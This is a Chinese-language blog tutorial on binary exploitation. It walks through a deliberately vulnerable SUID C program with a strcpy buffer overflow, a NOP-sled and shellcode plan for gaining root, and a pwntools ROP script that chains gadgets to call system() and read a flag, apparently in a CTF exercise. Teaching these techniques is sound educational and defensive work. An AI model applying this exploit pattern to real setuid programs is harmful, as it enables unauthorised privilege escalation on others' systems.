# 二进制安全：ROP巫术使用

大家好，我带着二进制攻击系列的下一篇文章回来了。在上一篇文章中，我已经为从未接触过这项技术的人介绍了基本概念，并承诺会用简单的步骤来解释这个主题。如果你对二进制技术还不熟悉，可以先阅读我的上一篇文章。

## 1. 深度解析

在Linux系统中，如果没有root权限，很多操作都无法进行。SUID（Set Owner User ID）是一种特殊权限设置，允许用户以文件所有者的权限执行该文件。如果一个程序设置了SUID位，当用户运行该程序时，它将以文件所有者的权限运行，通常是root权限。

### 示例代码

下面是一个简单的C语言示例代码`vuln.c`，其中存在一个缓冲区溢出漏洞：

```c
#include <stdio.h>
#include <string.h>

void abracadabra(char *fun) {
    char data[400];
    strcpy(data, fun);
    printf("copied..!!\n");
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        printf("No input provided..!\n");
        return 1;
    }
    abracadabra(argv[1]);
    return 0;
}
```

在这个例子中，`abracadabra`函数没有检查输入字符串的长度，直接将其复制到固定大小的缓冲区`data`中。如果输入字符串超过400字节，就会导致缓冲区溢出。

### 利用缓冲区溢出

我们可以利用这个漏洞提升权限。假设这个程序设置了SUID位，那么我们可以通过以下步骤来利用它：

1. **分析内存布局**：使用GDB调试器分析程序的内存布局，找到EIP（指令指针）的位置。
2. **构造payload**：通过构造特定的输入数据，覆盖EIP并控制程序的执行流程。

例如，我们可以构造如下payload：

- 359个NOP指令
- 53字节的shellcode
- EIP地址（指向NOP滑动窗）

这样，当程序执行到被覆盖的EIP时，会跳转到NOP滑动窗，最终执行我们的shellcode，从而获得root权限。

## 2. 不可执行堆栈（NX）

现代操作系统通常启用了NX（No-eXecute）保护机制，禁止在堆栈上执行代码。这使得传统的基于栈溢出的攻击变得更加困难。

### 如何绕过NX

虽然NX保护机制阻止了直接在堆栈上执行shellcode，但我们可以通过返回导向编程（Return-Oriented Programming, ROP）来绕过这一限制。

## 3. 返回导向编程（ROP）

ROP是一种利用现有代码片段（称为gadget）来构建攻击链的技术。通过控制调用栈，攻击者可以将这些gadget链接起来，实现任意代码执行。

### 示例

假设我们有一个不可执行堆栈的程序，我们需要找到一种方法来执行`cat /bin/flag.txt`命令。我们可以通过以下步骤来实现：

1. **查找gadget**：使用工具如`objdump`或`ROPgadget`来查找有用的gadget。
2. **构建payload**：将这些gadget按顺序排列，形成一个有效的攻击链。

例如，假设我们找到了以下gadget：

- `pop rdi; ret`：用于将参数传递给`system`函数
- `system`函数的地址
- 字符串`/bin/cat flag.txt`的地址

我们可以构建如下payload：

```python
from pwn import *

# 加载目标程序
xrx = ELF('./split')

# 构建payload
payload = "A" * 40  # 填充缓冲区
payload += p64(0x004007c3)  # pop rdi; ret
payload += p64(0x00601060)  # 地址指向"/bin/cat flag.txt"
payload += p64(0x00400560)  # system()函数地址

# 启动进程
p = xrx.process()
print(p.recvuntil(">"))
p.sendline(payload)
p.interactive()
```

运行这个脚本后，程序的执行流程会被改变，最终执行`cat /bin/flag.txt`命令，输出flag。

## 总结

本文介绍了如何利用缓冲区溢出和ROP技术来绕过NX保护机制。通过深入理解这些技术，你可以更好地理解和防御类似的攻击。希望这篇文章对你有所帮助！